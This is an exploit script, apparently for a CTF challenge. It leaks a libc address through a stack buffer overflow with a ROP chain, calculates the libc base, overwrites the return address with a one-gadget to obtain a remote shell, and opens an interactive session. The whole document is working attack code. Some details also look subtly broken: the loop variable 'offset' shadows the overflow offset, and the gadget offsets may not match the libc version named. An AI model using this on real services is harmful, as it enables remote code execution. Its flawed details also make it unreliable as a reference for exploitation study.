# One-gadget RCE exploitation - quick shell with single address
# Requires libc leak and meeting constraint conditions

let binary = "./vuln_binary"  # Compile from vuln.c in examples/
let host = "pwn.chal.ctf"     # Replace with actual CTF target
let port = 4444

print("[*] One-Gadget RCE Exploitation")

# Analyze binary
let elf = analyze(binary)
let plt_puts = elf.plt.puts
let got_libc_start = elf.got.__libc_start_main
let main_addr = elf.symbols.main

# Find gadgets
let gadgets = quick_rop(binary)
let pop_rdi = find(gadgets, "pop rdi; ret")

print("[*] PLT/GOT addresses:")
print("    puts@PLT:", hex(plt_puts))
print("    __libc_start_main@GOT:", hex(got_libc_start))

# Connect and leak libc
let conn = connect(host, port)
let offset = 88  # Buffer overflow offset

# Leak payload
let leak_chain = cyclic(offset) + p64(pop_rdi) + p64(got_libc_start) + p64(plt_puts) + p64(main_addr)
send(conn, leak_chain)

let leaked = recv_until(conn, "\n")
let leak = u64(leaked)
print("[+] Leaked __libc_start_main:", hex(leak))

# Calculate libc base dynamically
let libc_template = Libc("ubuntu20.04")
let libc_start_offset = libc_template.symbols.__libc_start_main
let libc_base = leak - libc_start_offset
print("[+] Libc base:", hex(libc_base))

# One-gadget RCE offsets - calculate from libc database
# Use one_gadget tool to find these for your libc version
let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c]
let one_gadgets = []
for offset in one_gadget_offsets {    push(one_gadgets, libc_base + offset)
}
print("[*] One-gadget addresses:")
for i in range(len(one_gadgets)) {    print("    Gadget", i, ":", hex(one_gadgets[i]))
}
# Try each one-gadget (usually one will work based on stack state)
# Start with most reliable one
let one_gadget = one_gadgets[0]

# Build final payload - just overflow to one-gadget
let final_payload = cyclic(offset) + p64(one_gadget)

send(conn, final_payload)
print("[+] One-gadget sent! Checking for shell...")

# Quick check if we got shell
send(conn, "id\n")
let response = recv(conn, 1024)

if "uid=" in str(response) {    print("[+] SUCCESS! Shell obtained!")
    interactive(conn)
} else {    print("[-] One-gadget failed, constraints not met")
    print("[*] Try different gadget or adjust stack")
}